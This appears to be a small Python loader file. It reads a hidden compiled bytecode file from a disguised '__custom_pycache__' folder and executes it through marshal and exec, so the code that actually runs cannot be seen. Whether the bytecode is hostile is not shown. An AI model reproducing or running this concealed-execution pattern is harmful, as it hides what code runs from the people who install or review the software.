
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_208a2933f70b43278aabb07c58651b42.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
